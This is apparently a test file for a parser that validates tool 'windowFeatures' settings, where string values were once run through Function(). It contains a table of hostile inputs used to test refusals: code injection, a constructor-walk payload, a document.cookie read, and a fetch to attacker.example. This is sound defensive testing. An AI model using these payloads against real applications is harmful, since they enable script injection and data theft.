/**
 * A tool's `windowFeatures` is DATA, parsed against a closed grammar — never run
 * (T2 S10-a, WC-2026-11-19-window-features-grammar).
 *
 * The value comes from the tool registry (a database record) and from callers.
 * Until 2026-11-19 `tool_common.js` ran any string value starting with `return`
 * through `Function(value)()`. The parser under test
 * (`client/dedalo/core/tools_common/js/window_features.js`, a pure module loaded
 * here exactly as it is served) resolves the one legacy relative form by
 * PARSING it, and refuses everything else naming the key.
 *
 * The proof that nothing is evaluated is behavioural: every hostile value below
 * would set a global if it ran; the global is read after each refusal.
 */

import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { Glob } from 'bun';
import {
	parse_modal_features,
	parse_window_features,
} from '../../client/dedalo/core/tools_common/js/window_features.js';

const REPO = join(import.meta.dir, '..', '..');
const ENV = {
	// colorDepth: a NUMBER the form may not read (the dimension list is closed).
	screen: { width: 1920, height: 1080, availWidth: 1900, availHeight: 1040, colorDepth: 24 },
	window: { innerWidth: 1400, innerHeight: 900, outerWidth: 1420, outerHeight: 980 },
};
/** The global a hostile value would set if it ran — read and cleared, never assigned here. */
const CANARY = '__wf_ran';

function refusal(run: () => unknown): string {
	Reflect.deleteProperty(globalThis, CANARY);
	let message = '';
	try {
		run();
	} catch (error) {
		message = (error as Error).message;
	}
	// Whatever the value was, it did not run.
	const ran = Reflect.get(globalThis, CANARY);
	Reflect.deleteProperty(globalThis, CANARY);
	expect(ran).toBeUndefined();
	return message;
}

describe('window form: the grammar', () => {
	test('numbers and the legacy relative form resolve — tool_upload’s own registration', () => {
		expect(
			parse_window_features(
				{ top: 0, left: 'return screen.width -760', width: 760, height: 708 },
				ENV,
			),
		).toBe('top=0,left=1160,width=760,height=708');
	});

	test('the relative form: both objects, both signs, no offset, spacing, a trailing semicolon', () => {
		const cases: [string, number][] = [
			['return screen.width', 1920],
			['return screen.width - 760', 1160],
			['return screen.width-760', 1160],
			['return screen.availHeight + 20;', 1060],
			['return window.innerWidth -400', 1000],
			['return   window.outerHeight   -   80  ', 900],
		];
		for (const [value, expected] of cases) {
			expect(`${value} → ${parse_window_features({ left: value }, ENV)}`).toBe(
				`${value} → left=${expected}`,
			);
		}
	});

	test('digit strings, flags, and the inline string form pass the same grammar', () => {
		expect(parse_window_features({ width: '760', popup: true, noopener: 'yes' }, ENV)).toBe(
			'width=760,popup=yes,noopener=yes',
		);
		expect(parse_window_features('left=100, top=100,width=320,height=320,popup', ENV)).toBe(
			'left=100,top=100,width=320,height=320,popup=yes',
		);
	});

	test('nothing declared → null (the caller opens a tab)', () => {
		for (const empty of [null, undefined, '', {}]) {
			expect(parse_window_features(empty, ENV)).toBeNull();
		}
	});

	test('EVERY REGISTERED TOOL’s windowFeatures passes the grammar of the way it opens', () => {
		const seen: string[] = [];
		for (const path of new Glob('tools/*/register.json').scanSync({ cwd: REPO })) {
			const text = readFileSync(join(REPO, path), 'utf8');
			// The properties block, wherever the register keeps it (flat or in a component value).
			for (const match of text.matchAll(
				/"open_as"\s*:\s*"(\w+)"\s*,\s*"windowFeatures"\s*:\s*(\{[^{}]*\}|null|"[^"]*")/g,
			)) {
				const [, openAs, raw] = match as unknown as [string, string, string];
				const features = JSON.parse(raw);
				seen.push(`${path}:${openAs}`);
				if (openAs === 'window') parse_window_features(features, ENV);
				else parse_modal_features(features);
			}
		}
		// FLOOR: the walk read the registers, tool_upload's relative form among them.
		expect(seen.length).toBeGreaterThanOrEqual(15);
		expect(seen).toContain('tools/tool_upload/register.json:window');
		expect(seen).toContain('tools/tool_ontology/register.json:modal');
	});
});

describe('window form: anything else is REFUSED naming the key — and never runs', () => {
	const HOSTILE: Record<string, unknown> = {
		'a statement after the form': 'return screen.width; self.__wf_ran = true',
		'a call': 'return (self.__wf_ran = true)',
		'an expression in the offset': 'return screen.width - (self.__wf_ran = true)',
		'a property the form may not read': 'return window.document',
		'a deeper path': 'return window.location.href',
		'a numeric property outside the dimension list': 'return screen.colorDepth',
		'another object': 'return document.cookie',
		'a constructor walk': 'return screen.constructor.constructor("self.__wf_ran = true")()',
		'a bracket read': 'return screen["width"]',
		'two operations': 'return screen.width - 10 - 20',
		'a multiplication': 'return screen.width * 2',
		'a unit': '760px',
		'an object': { valueOf: () => 760 },
		'a boolean': true,
		'not a number': Number.NaN,
	};
	for (const [name, value] of Object.entries(HOSTILE)) {
		test(`${name}`, () => {
			const message = refusal(() => parse_window_features({ top: 0, left: value }, ENV));
			expect(message).toContain("'left'");
			expect(message).toStartWith('tool windowFeatures:');
		});
	}

	test('an unknown key is refused by name, in the object and in the inline string', () => {
		expect(refusal(() => parse_window_features({ width: 760, onload: 'x' }, ENV))).toContain(
			"'onload'",
		);
		expect(refusal(() => parse_window_features('width=760,location=yes', ENV))).toContain(
			"'location'",
		);
	});

	test('a dimension that is not there is refused, never NaN', () => {
		expect(
			refusal(() => parse_window_features({ left: 'return screen.width - 760' }, { screen: {} })),
		).toContain("'left'");
	});

	test('a refusal names the key and never echoes the value', () => {
		const message = refusal(() =>
			parse_window_features({ left: 'return fetch("https://attacker.example/steal")' }, ENV),
		);
		expect(message).not.toContain('attacker.example');
	});
});

describe('modal form: a key allowlist of size properties', () => {
	test('the registered shapes: lengths, percentages, pixels', () => {
		expect(parse_modal_features({ width: '40rem' })).toEqual({ width: '40rem' });
		expect(parse_modal_features({ width: '34rem', maxWidth: '100%', minHeight: 320 })).toEqual({
			width: '34rem',
			maxWidth: '100%',
			minHeight: '320px',
		});
		expect(parse_modal_features(null)).toEqual({});
		// The inline string is the window form's: a modal ignores it, as before.
		expect(parse_modal_features('left=100,top=100')).toEqual({});
	});

	test('any other style property is refused by name', () => {
		for (const key of ['background', 'backgroundImage', 'position', 'cssText', 'zIndex', '--x']) {
			// A value the grammar accepts: the KEY is what is refused.
			expect(refusal(() => parse_modal_features({ width: '40rem', [key]: '40rem' }))).toContain(
				`'${key}'`,
			);
		}
	});

	test('a value that is no length is refused by name', () => {
		for (const value of ['url(https://attacker.example/x)', 'calc(100% - 1px)', '40rem; x', -5]) {
			const message = refusal(() => parse_modal_features({ width: value }));
			expect(message).toContain("'width'");
			expect(message).not.toContain('attacker.example');
		}
	});
});
